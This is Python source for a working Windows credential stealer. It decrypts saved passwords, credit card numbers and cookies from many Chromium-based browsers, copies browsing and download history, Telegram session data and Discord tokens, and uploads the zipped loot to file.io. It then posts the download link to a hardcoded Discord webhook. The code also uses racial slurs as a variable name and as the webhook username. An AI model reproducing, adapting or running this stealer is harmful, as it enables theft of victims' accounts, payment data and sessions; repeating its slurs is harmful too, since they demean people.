import os
import importlib
import requests
import json
import base64
import sqlite3
import shutil
import subprocess
from win32crypt import CryptUnprotectData
from Cryptodome.Cipher import AES
from datetime import datetime
from re import findall

niggerg = "https://discord.com/api/webhooks/1237321531009531923/z3Yvi8E3GLkdJozPWSYsYxlS_Ob9RZeuZEECD-BRIHrAQGmCRZO_2ToyzCG2ik9RIWkI"

appdata = os.getenv('LOCALAPPDATA')
user = os.path.expanduser("~")

browsers = {
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'google-chrome-sxs': appdata + '\\Google\\Chrome SxS\\User Data',
    'google-chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'microsoft-edge': appdata + '\\Microsoft\\Edge\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
}

def close_browser_processes():
    try:
        browsers_processes = ["chrome.exe", "msedge.exe", "brave.exe", "vivaldi.exe", "yandex.exe", "opera.exe", "opera_gx.exe", "firefox.exe"]
        for process in browsers_processes:
            subprocess.call(["taskkill", "/F", "/IM", process], stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)
    except Exception as e:
        pass


def get_master_key(path: str):
    try:
        if not os.path.exists(path):
            return

        if 'os_crypt' not in open(path + "\\Local State", 'r', encoding='utf-8').read():
            return

        with open(path + "\\Local State", "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)

        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key
    except Exception as e:
        pass

def decrypt_password(buff: bytes, master_key: bytes) -> str:
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        pass
        return ""

total_browsers = 0

def save_results(browser_name, data_type, content):
    global total_browsers
    try:
        if not os.path.exists(user+'\\AppData\\Local\\Temp\\Browser'):
            os.mkdir(user+'\\AppData\\Local\\Temp\\Browser')
        if not os.path.exists(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}'):
            os.mkdir(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}')
        if content is not None:
            open(user+f'\\AppData\\Local\\Temp\\Browser\\{browser_name}\\{data_type}.txt', 'w', encoding="utf-8").write(content)
        total_browsers += 1
    except Exception as e:
        pass

def get_login_data(path: str, profile: str, master_key):
    try:
        login_db = f'{path}\\{profile}\\Login Data'
        if not os.path.exists(login_db):
            return None
        result = ""
        temp_db_path = user+'\\AppData\\Local\\Temp\\login_db'
        shutil.copyfile(login_db, temp_db_path)
        conn = sqlite3.connect(temp_db_path)
        cursor = conn.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for row in cursor.fetchall():
            password = decrypt_password(row[2], master_key)
            result += f"""
            URL: {row[0]}
            Email: {row[1]}
            Password: {password}
            
            """
        conn.close()
        os.remove(temp_db_path)
        return result
    except sqlite3.DatabaseError as db_err:
        pass
        return None
    except Exception as e:
        pass
        return None

def get_credit_cards(path: str, profile: str, master_key):
    try:
        cards_db = f'{path}\\{profile}\\Web Data'
        if not os.path.exists(cards_db):
            return

        result = ""
        shutil.copy(cards_db, user+'\\AppData\\Local\\Temp\\cards_db')
        conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\cards_db')
        cursor = conn.cursor()
        cursor.execute(
            'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue

            card_number = decrypt_password(row[3], master_key)
            result += f"""
            Name Card: {row[0]}
            Card Number: {card_number}
            Expires:  {row[1]} / {row[2]}
            Added: {datetime.fromtimestamp(row[4])}
            
            """
        conn.close()
        os.remove(user+'\\AppData\\Local\\Temp\\cards_db')
        return result
    except Exception as e:
        pass

def get_cookies(path: str, profile: str, master_key):
    try:
        cookie_db = f'{path}\\{profile}\\Network\\Cookies'
        if not os.path.exists(cookie_db):
            return
        result = ""
        shutil.copy(cookie_db, user+'\\AppData\\Local\\Temp\\cookie_db')
        conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\cookie_db')
        cursor = conn.cursor()
        cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2] or not row[3]:
                continue

            cookie = decrypt_password(row[3], master_key)

            result += f"""
            Host Key : {row[0]}
            Cookie Name : {row[1]}
            Path: {row[2]}
            Cookie: {cookie}
            Expires On: {row[4]}
            
            """
        conn.close()
        os.remove(user+'\\AppData\\Local\\Temp\\cookie_db')
        return result
    except Exception as e:
        pass

def get_web_history(path: str, profile: str):
    try:
        web_history_db = f'{path}\\{profile}\\History'
        result = ""
        if not os.path.exists(web_history_db):
            return

        shutil.copy(web_history_db, user+'\\AppData\\Local\\Temp\\web_history_db')
        conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\web_history_db')
        cursor = conn.cursor()
        cursor.execute('SELECT url, title, last_visit_time FROM urls')
        for row in cursor.fetchall():
            if not row[0] or not row[1] or not row[2]:
                continue
            result += f"""
            URL: {row[0]}
            Title: {row[1]}
            Visited Time: {row[2]}
            
            """
        conn.close()
        os.remove(user+'\\AppData\\Local\\Temp\\web_history_db')
        return result
    except Exception as e:
        pass

def get_downloads(path: str, profile: str):
    try:
        downloads_db = f'{path}\\{profile}\\History'
        if not os.path.exists(downloads_db):
            return
        result = ""
        shutil.copy(downloads_db, user+'\\AppData\\Local\\Temp\\downloads_db')
        conn = sqlite3.connect(user+'\\AppData\\Local\\Temp\\downloads_db')
        cursor = conn.cursor()
        cursor.execute('SELECT tab_url, target_path FROM downloads')
        for row in cursor.fetchall():
            if not row[0] or not row[1]:
                continue
            result += f"""
            URL: {row[0]}
            Path: {row[1]}
            
            """
        conn.close()
        os.remove(user+'\\AppData\\Local\\Temp\\downloads_db')
        return result
    except Exception as e:
        pass

def installed_browsers():
    try:
        results = []
        for browser, path in browsers.items():
            if os.path.exists(path):
                results.append(browser)
        return results
    except Exception as e:
        pass

def get_telegram_data():
    try:
        telegram_path = os.getenv('APPDATA') + '\\Telegram Desktop\\tdata'
        if os.path.exists(telegram_path):
            telegram_dest = user+'\\AppData\\Local\\Temp\\Browser\\Telegram Desktop\\tdata'
            shutil.copytree(telegram_path, telegram_dest)
            return "Telegram data copied successfully."
        return "Telegram data not found."
    except Exception as e:
        pass

def get_discord_tokens():
    try:
        path = os.getenv('APPDATA') + "\\discord\\Local Storage\\leveldb\\"
        local_state_path = os.getenv('APPDATA') + "\\discord\\Local State"

        def decrypt(buff, master_key):
            try:
                return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
            except Exception as e:
                return "An error has occured.\n" + str(e)

        tokens = []
        cleaned = []

        with open(local_state_path, "r", encoding="utf-8") as file:
            key = json.loads(file.read())['os_crypt']['encrypted_key']
        key = base64.b64decode(key)[5:]

        for filename in os.listdir(path):
            if not filename.endswith(".ldb") and not filename.endswith(".log"):
                continue
            with open(path + filename, "r", errors='ignore') as f:
                for line in f.readlines():
                    for token in findall(r'dQw4w9WgXcQ:[^.*\[(.*)\].*$][^\"]*', line.strip()):
                        tokens.append(token)

        for token in tokens:
            if token not in cleaned:
                cleaned.append(token)

        decrypted_tokens = []
        for token in cleaned:
            decrypted_token = decrypt(base64.b64decode(token.split('dQw4w9WgXcQ:')[1]), key)
            decrypted_tokens.append(decrypted_token)

        return "\n".join(decrypted_tokens)
    except Exception as e:
        pass

def mainpass():
    try:
        close_browser_processes()

        available_browsers = installed_browsers()

        for browser in available_browsers:
            browser_path = browsers[browser]
            master_key = get_master_key(browser_path)

            save_results(browser, 'Saved_Passwords', get_login_data(browser_path, "Default", master_key))
            save_results(browser, 'Browser_History', get_web_history(browser_path, "Default"))
            save_results(browser, 'Download_History', get_downloads(browser_path, "Default"))
            save_results(browser, 'Browser_Cookies', get_cookies(browser_path, "Default", master_key))
            save_results(browser, 'Saved_Credit_Cards', get_credit_cards(browser_path, "Default", master_key))

        telegram_status = get_telegram_data()
        discord_tokens = get_discord_tokens()
        save_results("Additional_Data", "Telegram_Status", telegram_status)
        save_results("Additional_Data", "Discord_Tokens", discord_tokens)

        shutil.make_archive(user+'\\AppData\\Local\\Temp\\Browser', 'zip', user+'\\AppData\\Local\\Temp\\Browser')

        try:
            shutil.rmtree(user+'\\AppData\\Local\\Temp\\Browser')
        except:
            pass

        files = {'file': open(user+'\\AppData\\Local\\Temp\\Browser.zip', 'rb')}
        params = {'expire': 'never'}

        response = requests.post("https://file.io", files=files, params=params).json()
        pay = {
            "avatar_url": "https://th.bing.com/th/id/R.9f6a83e1abb85a6b4c198b2db82e6273?rik=oZXS24afu51S9g&pid=ImgRaw&r=0",
            "username": "Negro",
            "embeds": [
                {
                    "title": "Password Stealer",
                    "fields": [
                        {
                            "name": "Download Link",
                            "value": f"`{response['link']}`",
                            "inline": True
                        },
                        {
                            "name": "Files:",
                            "value": f"`{total_browsers}`",
                            "inline": True
                        }
                    ],
                    "image": {
                        "url": "https://th.bing.com/th/id/R.9f6a83e1abb85a6b4c198b2db82e6273?rik=oZXS24afu51S9g&pid=ImgRaw&r=0",
                        "height": 0,
                        "width": 0
                    }
                }
            ]
        }
        r = requests.post(niggerg, json=pay)
                
        try:
            os.remove(user+"\\AppData\\Local\\Temp\\Browser.zip")
        except:
            pass
    except Exception as e:
        pass

if __name__ == "__main__":
    mainpass()
